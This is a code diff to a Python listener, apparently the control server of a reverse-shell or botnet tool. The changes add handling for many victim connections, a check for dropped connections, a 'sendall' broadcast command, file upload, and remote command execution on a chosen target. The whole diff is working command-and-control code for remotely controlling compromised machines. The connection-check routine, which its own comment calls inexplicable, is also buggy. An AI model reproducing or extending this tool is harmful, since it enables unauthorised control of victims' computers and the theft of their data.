@@ -3,6 +3,7 @@
 import socket
 import json
 import base64
+import select
 import multiprocessing
 from time import sleep
 
@@ -43,24 +44,38 @@ class Listener:
             except Exception:
                 pass
 
+    # function that checks for disconnected sockets !WARNING! DON'T ASK HOW IT WORKS! I DON'T KNOW EITHER! IT SHOULD
+    # NOT WORK BUT IT DOES! BASED ON DOCUMENTATIONS IT MAKES ZERO SENSE! DON'T CHANGE ANYTHING OR BAD THINGS HAPPEN!
+    def check_connections(self):
+        for i, connection in enumerate(self.connections):
+            ready = select.select([self.connections[i]], [], [], 0.1)
+            self.reliable_send(["PING"], i)
+            self.connections[i].recv(1024)
+            if not ready[0]:
+                pass
+            else:
+                connection.close()
+                del self.connections[i]
+                del self.addresses[i]
+
     # function that sends json objects through socket connection
-    def reliable_send(self, data):
+    def reliable_send(self, data, i):
         json_data = json.dumps(data).encode('utf-8')
-        self.connections[self.num].send(json_data)
+        self.connections[i].send(json_data)
 
     # function that receives json objects through socket connection
-    def reliable_receive(self):
+    def reliable_receive(self, i):
         json_data = "".encode('utf-8')
         while True:
             try:
-                json_data = json_data + self.connections[self.num].recv(1024)
+                json_data = json_data + self.connections[i].recv(1024)
                 return json.loads(json_data.decode('utf-8'))
             except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
                 continue
 
-    def execute_remotely(self, command):
-        self.reliable_send(command)     # send the command to the target
-        return self.reliable_receive()  # receive the results from the executed command
+    def execute_remotely(self, command, i):
+        self.reliable_send(command, i)     # send the command to the target
+        return self.reliable_receive(i)  # receive the results from the executed command
 
     def shell(self):
         while True:
@@ -71,12 +86,16 @@ class Listener:
             if command[0] == "exit":
                 json_data = json.dumps(["killconnection"]).encode('utf-8')
                 for connection in self.connections:
-                    connection.send(json_data)
-                    connection.close()
+                    try:
+                        connection.send(json_data)
+                        connection.close()
+                    except Exception:
+                        print("[!] One connection not found.")
                 self.listener.close()
                 break
 
             elif command[0] == "connections":
+                self.check_connections()
                 for i, address in enumerate(self.addresses):
                     print("{}. {}".format(str(i), str(address)))
 
@@ -87,18 +106,29 @@ class Listener:
                 # except Exception:
                 #     print("[!] Connection not found.")
 
+            elif command[0] == "sendall":
+                json_data = json.dumps(command[1:]).encode('utf-8')
+                for connection in self.connections:
+                    try:
+                        connection.send(json_data)
+                    except Exception:
+                        print("[!] One connection not found.")
+
+            else:
+                print("[-] Command does not exist.")
+
     def session(self):
         while True:
             command = input("Shell:~{}# ".format(str(self.addresses[self.num])))
             command = command.split(" ")
 
-            if command[0] != "killconnections":
+            if command[0] != "killconnection":
                 # try:
                 if command[0] == "upload":
                     file_content = read_file(command[1])
                     command.append(file_content.decode('utf-8'))  # add to the command the content of the file
 
-                result = self.execute_remotely(command)
+                result = self.execute_remotely(command, self.num)
 
                 if command[0] == "exit":
                     break
